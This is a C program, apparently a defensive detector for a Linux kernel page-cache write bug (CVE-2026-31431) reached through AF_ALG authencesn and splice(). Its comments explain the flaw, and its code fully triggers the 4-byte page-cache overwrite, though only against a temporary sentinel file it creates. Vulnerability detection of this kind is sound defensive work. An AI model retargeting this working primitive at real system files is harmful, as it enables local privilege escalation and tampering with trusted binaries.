/*
 * CVE-2026-31431 ("Copy Fail") — safe vulnerability detector.
 *
 * Tests whether the authencesn page-cache scratch-write primitive is
 * reachable on this kernel. Works by targeting a user-owned sentinel
 * file in a temp directory — no system binaries are touched.
 *
 * Background
 * ----------
 * The AF_ALG crypto socket interface lets unprivileged userspace drive
 * kernel crypto operations. When an AEAD request uses the in-place
 * optimization (algif_aead.c, commit 72548b093ee3, 2017), source and
 * destination scatterlists share the same pages. If the source pages
 * came from splice() (i.e. they're file-backed page-cache pages), the
 * authencesn algorithm's ESN byte-rearrangement ("scratch write") lands
 * directly in the page cache — a controlled 4-byte overwrite of any
 * readable file's in-memory contents.
 *
 * The fix (commit a664bf3d603d, April 2026) separates the source and
 * destination scatterlists so page-cache pages stay read-only.
 *
 * Detection strategy
 * ------------------
 * 1. Create a sentinel file filled with a known pattern.
 * 2. Read it to populate the page cache.
 * 3. Set up an AF_ALG AEAD socket with authencesn, send AAD containing
 *    a marker value ("PWND") as seqno_lo (bytes 4-7).
 * 4. splice() the sentinel's page-cache pages into the AEAD request.
 * 5. Trigger decrypt via recv() — the scratch write fires before the
 *    (expected) auth-check failure.
 * 6. Re-read the sentinel via the same fd (page cache, not disk).
 * 7. If the marker appears, the scratch write reached the page cache.
 *
 * Exit codes: 0 = NOT vulnerable, 2 = VULNERABLE, 1 = test error.
 *
 * Reference: https://copy.fail / https://xint.io/blog/copy-fail-linux-distributions
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

/* AF_ALG constants — not always in userspace headers, especially with musl. */
#ifndef AF_ALG
#define AF_ALG 38
#endif

#define SOL_ALG               279
#define ALG_SET_KEY            1
#define ALG_SET_IV             2
#define ALG_SET_OP             3
#define ALG_SET_AEAD_ASSOCLEN  4

/*
 * The kernel's struct sockaddr_alg (from <linux/if_alg.h>).
 * Defined here so we can compile against musl or minimal headers.
 */
struct sockaddr_alg {
    uint16_t salg_family;
    uint8_t  salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t  salg_name[64];
};

/* The specific algorithm whose ESN scratch-write causes the bug. */
#define ALG_NAME  "authencesn(hmac(sha256),cbc(aes))"

#define PAGE_SZ   4096
#define ASSOCLEN  8      /* IPsec-style AAD: SPI(4) + seqno_lo(4) */
#define CRYPTLEN  16     /* one AES-CBC block */
#define TAGLEN    16     /* truncated HMAC-SHA256 tag */

/* Marker value injected as AAD seqno_lo (bytes 4-7). */
static const unsigned char MARKER[4] = { 'P', 'W', 'N', 'D' };

static const char SENTINEL_PATTERN[] = "COPYFAIL-SENTINEL-UNCORRUPTED!!\n";


/*
 * Build the authenc key blob the kernel expects:
 *   struct rtattr { u16 rta_len; u16 rta_type; }  (8 bytes, type=1)
 *   __be32 enckeylen                               (big-endian)
 *   authkey[]                                      (32 bytes for HMAC-SHA256)
 *   enckey[]                                       (16 bytes for AES-128)
 *
 * Values don't matter for triggering the bug — all zeroes is fine.
 */
static void build_authenc_keyblob(unsigned char *out, size_t *out_len)
{
    uint16_t rta_len  = 8;
    uint16_t rta_type = 1;
    uint32_t enckeylen_be = htonl(16);

    memcpy(out,      &rta_len,  2);
    memcpy(out + 2,  &rta_type, 2);
    memcpy(out + 4,  &enckeylen_be, 4);
    memset(out + 8,  0, 32);    /* authkey */
    memset(out + 40, 0, 16);    /* enckey  */
    *out_len = 56;
}


/*
 * Verify that the kernel can instantiate AF_ALG + authencesn.
 * Returns NULL on success, or a human-readable reason on failure.
 */
static const char *precheck(void)
{
    int fd;
    struct sockaddr_alg sa;

    if (access("/proc/crypto", F_OK) != 0)
        return "/proc/crypto missing";

    fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0)
        return "AF_ALG socket family unavailable";
    close(fd);

    fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0)
        return "AF_ALG socket failed";

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type));
    strncpy((char *)sa.salg_name, ALG_NAME, sizeof(sa.salg_name));

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return ALG_NAME " cannot be instantiated";
    }
    close(fd);
    return NULL;
}


/*
 * Attempt to trigger the page-cache scratch write against a sentinel file.
 *
 * On return, after_buf contains the sentinel's page-cache contents post-trigger,
 * and sentinel_buf contains the original pattern for comparison.
 *
 * Returns: 0 = completed (check buffers), 1 = error (could not run the test).
 */
static int attempt_trigger(const char *target_path,
                           unsigned char *after_buf, unsigned char *sentinel_buf)
{
    int fd_target, master_fd, op_fd;
    int pipefd[2];
    struct sockaddr_alg sa;
    ssize_t n;
    size_t pat_len = strlen(SENTINEL_PATTERN);

    /* Create the sentinel file: one page filled with a known pattern. */
    {
        int wfd = open(target_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (wfd < 0) { perror("open(sentinel, W)"); return 1; }
        for (size_t off = 0; off < PAGE_SZ; off += pat_len) {
            size_t chunk = PAGE_SZ - off;
            if (chunk > pat_len) chunk = pat_len;
            if (write(wfd, SENTINEL_PATTERN, chunk) < 0) {
                perror("write(sentinel)"); close(wfd); return 1;
            }
        }
        close(wfd);
    }

    /* Keep a copy of the original pattern for diffing later. */
    for (size_t off = 0; off < PAGE_SZ; off += pat_len) {
        size_t chunk = PAGE_SZ - off;
        if (chunk > pat_len) chunk = pat_len;
        memcpy(sentinel_buf + off, SENTINEL_PATTERN, chunk);
    }

    /* Read the file to pull it into the page cache. */
    fd_target = open(target_path, O_RDONLY);
    if (fd_target < 0) { perror("open(sentinel, R)"); return 1; }
    if (read(fd_target, after_buf, PAGE_SZ) < PAGE_SZ) {
        perror("read(populate cache)");
        close(fd_target);
        return 1;
    }
    if (lseek(fd_target, 0, SEEK_SET) < 0) {
        perror("lseek"); close(fd_target); return 1;
    }

    /* --- Set up the AF_ALG AEAD socket --- */

    master_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (master_fd < 0) { perror("socket"); close(fd_target); return 1; }

    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strncpy((char *)sa.salg_type, "aead", sizeof(sa.salg_type));
    strncpy((char *)sa.salg_name, ALG_NAME, sizeof(sa.salg_name));

    if (bind(master_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(master_fd); close(fd_target); return 1;
    }

    {
        unsigned char keyblob[56];
        size_t keylen;
        build_authenc_keyblob(keyblob, &keylen);
        if (setsockopt(master_fd, SOL_ALG, ALG_SET_KEY, keyblob, keylen) < 0) {
            perror("setsockopt(KEY)");
            close(master_fd); close(fd_target); return 1;
        }
    }

    /* accept() yields a per-operation fd for one encrypt/decrypt request. */
    op_fd = accept(master_fd, NULL, NULL);
    if (op_fd < 0) {
        perror("accept"); close(master_fd); close(fd_target); return 1;
    }

    /*
     * Send the AAD via sendmsg with AEAD control parameters.
     *
     * AAD layout (8 bytes, matching ASSOCLEN):
     *   [0..3]  SPI       — 4 zero bytes (don't care)
     *   [4..7]  seqno_lo  — our MARKER ("PWND")
     *
     * The buggy code path in crypto_authenc_esn_decrypt() copies seqno_lo
     * into dst[assoclen + cryptlen] as a scratch operation. When dst points
     * to page-cache pages (via the in-place scatterlist), this overwrites
     * the file's cached contents with our marker.
     *
     * MSG_MORE tells the kernel more data follows (the splice'd pages).
     */
    {
        struct msghdr msg;
        struct iovec iov;
        unsigned char aad[ASSOCLEN];
        unsigned char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20) + CMSG_SPACE(4)];
        struct cmsghdr *cmsg;

        memset(&msg, 0, sizeof(msg));
        memset(aad, 0, 4);
        memcpy(aad + 4, MARKER, 4);

        iov.iov_base = aad;
        iov.iov_len = ASSOCLEN;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        memset(cbuf, 0, sizeof(cbuf));
        msg.msg_control = cbuf;
        msg.msg_controllen = sizeof(cbuf);

        /* ALG_SET_OP: decrypt (0) */
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_OP;
        cmsg->cmsg_len = CMSG_LEN(4);
        { uint32_t op = 0; memcpy(CMSG_DATA(cmsg), &op, 4); }

        /* ALG_SET_IV: struct af_alg_iv { u32 ivlen; u8 iv[]; } */
        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_IV;
        cmsg->cmsg_len = CMSG_LEN(20);
        { uint32_t ivlen = 16; memcpy(CMSG_DATA(cmsg), &ivlen, 4); }
        memset(CMSG_DATA(cmsg) + 4, 0, 16);

        /* ALG_SET_AEAD_ASSOCLEN: how many leading bytes are AAD */
        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
        cmsg->cmsg_len = CMSG_LEN(4);
        { uint32_t al = ASSOCLEN; memcpy(CMSG_DATA(cmsg), &al, 4); }

        if (sendmsg(op_fd, &msg, MSG_MORE) < 0) {
            perror("sendmsg");
            close(op_fd); close(master_fd); close(fd_target);
            return 1;
        }
    }

    /*
     * splice() the sentinel's page-cache pages into the AEAD request.
     *
     * splice passes page references (not copies) through the pipe into the
     * AF_ALG socket. When algif_aead runs in-place, these page-cache pages
     * end up in the writable destination scatterlist — that's the bug.
     */
    if (pipe(pipefd) < 0) {
        perror("pipe");
        close(op_fd); close(master_fd); close(fd_target);
        return 1;
    }

    {
        loff_t src_off = 0;
        size_t splice_len = CRYPTLEN + TAGLEN;

        n = splice(fd_target, &src_off, pipefd[1], NULL, splice_len, 0);
        if (n < 0) {
            if (errno == EOPNOTSUPP || errno == ENOTSUP) {
                fprintf(stderr, "[!] splice into AF_ALG not supported — "
                        "page-cache vector not reachable.\n");
            } else {
                perror("splice(file->pipe)");
            }
            close(pipefd[0]); close(pipefd[1]);
            close(op_fd); close(master_fd); close(fd_target);
            return 1;
        }
        if ((size_t)n != splice_len) {
            fprintf(stderr, "splice file->pipe short: %zd\n", n);
            close(pipefd[0]); close(pipefd[1]);
            close(op_fd); close(master_fd); close(fd_target);
            return 1;
        }

        n = splice(pipefd[0], NULL, op_fd, NULL, splice_len, 0);
        if (n < 0) {
            perror("splice(pipe->op)");
            close(pipefd[0]); close(pipefd[1]);
            close(op_fd); close(master_fd); close(fd_target);
            return 1;
        }
    }

    /*
     * recv() drives the AEAD decrypt operation. The auth check will fail
     * (EBADMSG) since we sent zeroes as ciphertext+tag, but that's fine —
     * the scratch write fires before the verify step returns an error.
     * The page-cache corruption has already happened by the time we get here.
     */
    {
        unsigned char recvbuf[ASSOCLEN + CRYPTLEN + TAGLEN];
        ssize_t r = recv(op_fd, recvbuf, sizeof(recvbuf), 0);
        (void)r;
    }

    close(pipefd[0]);
    close(pipefd[1]);
    close(op_fd);
    close(master_fd);

    /*
     * Re-read via the existing fd to get the page-cache version (not disk).
     * If the scratch write landed, this will differ from the original.
     */
    if (lseek(fd_target, 0, SEEK_SET) < 0) {
        perror("lseek(re-read)"); close(fd_target); return 1;
    }
    memset(after_buf, 0, PAGE_SZ);
    if (read(fd_target, after_buf, PAGE_SZ) < 0) {
        perror("read(re-read)"); close(fd_target); return 1;
    }
    close(fd_target);
    return 0;
}


/* Simple memmem — some C libraries (musl) may not expose it. */
static void *memmem_simple(const void *hay, size_t hlen,
                           const void *needle, size_t nlen)
{
    const unsigned char *h = hay;
    if (nlen > hlen) return NULL;
    for (size_t i = 0; i <= hlen - nlen; i++)
        if (memcmp(h + i, needle, nlen) == 0)
            return (void *)(h + i);
    return NULL;
}


int main(void)
{
    struct utsname uts;
    const char *reason;
    unsigned char after[PAGE_SZ], sentinel[PAGE_SZ];
    char tmpdir[] = "/tmp/copyfail-XXXXXX";
    char target[256];
    int ret;

    uname(&uts);
    printf("[*] CVE-2026-31431 detector  kernel=%s  arch=%s\n",
           uts.release, uts.machine);

    reason = precheck();
    if (reason) {
        printf("[+] Precondition not met (%s). NOT vulnerable.\n", reason);
        return 0;
    }
    printf("[+] AF_ALG + " ALG_NAME " loadable — precondition met.\n");

    if (mkdtemp(tmpdir) == NULL) {
        perror("mkdtemp"); return 1;
    }
    snprintf(target, sizeof(target), "%s/sentinel.bin", tmpdir);

    ret = attempt_trigger(target, after, sentinel);

    unlink(target);
    rmdir(tmpdir);

    if (ret == 1) {
        printf("[!] Trigger failed — see errors above.\n");
        return 1;
    }

    /*
     * Analysis: compare the page-cache contents to the original sentinel.
     *
     * Check 1: Did our specific marker land? This is the definitive signal —
     * the 4 bytes we placed in AAD seqno_lo appeared in the page cache.
     */
    {
        void *marker_in_after    = memmem_simple(after, PAGE_SZ, MARKER, 4);
        void *marker_in_sentinel = memmem_simple(sentinel, PAGE_SZ, MARKER, 4);

        if (marker_in_after && !marker_in_sentinel) {
            size_t off = (unsigned char *)marker_in_after - after;
            printf("[!] VULNERABLE to CVE-2026-31431.\n");
            printf("[!]   Marker \"PWND\" (AAD seqno_lo) landed in the "
                   "spliced page-cache page at offset %zu.\n", off);
            printf("[!]   Surrounding bytes: ");
            {
                size_t start = off > 4 ? off - 4 : 0;
                for (size_t j = start; j < off + 12 && j < PAGE_SZ; j++)
                    printf("%02x", after[j]);
            }
            printf("\n");
            printf("[!] Apply the upstream fix or block algif_aead.\n");
            return 2;
        }
    }

    /*
     * Check 2: Any modification at all? The marker might not land at the
     * expected offset on all kernel configs, but any change to the sentinel
     * means the in-place path exposed page-cache pages as writable.
     */
    {
        int diffs = 0, first = -1;
        for (int i = 0; i < PAGE_SZ; i++) {
            if (after[i] != sentinel[i]) {
                diffs++;
                if (first < 0) first = i;
            }
        }
        if (diffs > 0) {
            printf("[!] Page cache MODIFIED (%d bytes changed, first at "
                   "offset %d).\n", diffs, first);
            printf("[!]   Window: ");
            for (int j = first; j < first + 16 && j < PAGE_SZ; j++)
                printf("%02x", after[j]);
            printf("\n");
            printf("[!]   Marker didn't land, but kernel allowed a page-cache "
                   "page into the writable AEAD dst scatterlist.\n");
            printf("[!]   Treat as VULNERABLE until patched.\n");
            return 2;
        }
    }

    printf("[+] Page cache intact. NOT vulnerable on this kernel.\n");
    return 0;
}
